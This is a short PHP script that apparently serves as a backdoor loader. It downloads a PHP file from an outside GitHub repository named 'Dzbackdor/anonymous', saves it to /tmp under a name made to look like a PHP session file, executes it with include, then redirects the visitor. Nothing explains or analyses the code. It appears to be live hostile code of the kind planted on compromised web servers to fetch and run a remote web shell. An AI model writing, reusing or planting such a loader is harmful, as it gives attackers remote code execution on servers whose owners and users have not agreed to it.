<?php
$sessionFile = "sess_99" . md5("eXe") . ".php";
$localFile = "/tmp/{$sessionFile}";

$remoteUrl = "https://raw.githubusercontent.com/Dzbackdor/anonymous/refs/heads/main/query.php";

$contextOptions = [
    "ssl" => [
        "verify_peer" => true, 
        "verify_peer_name" => true,
    ]
];

$context = stream_context_create($contextOptions);

if (!file_exists($localFile) || filesize($localFile) === 0) {
    $remoteContent = @file_get_contents($remoteUrl, false, $context);

    if ($remoteContent === false) {
        error_log("Failed to download the remote file from $remoteUrl.");
        exit("An error occurred while fetching the remote file.");
    }

    if (file_put_contents($localFile, $remoteContent) === false) {
        error_log("Failed to save the downloaded file to $localFile.");
        exit("An error occurred while saving the file.");
    }
}

if (file_exists($localFile)) {
    include $localFile;
} else {
    error_log("Failed to include the local file: $localFile.");
    exit("An error occurred while including the file.");
}

header("Location: ?eXe");
exit();
?>
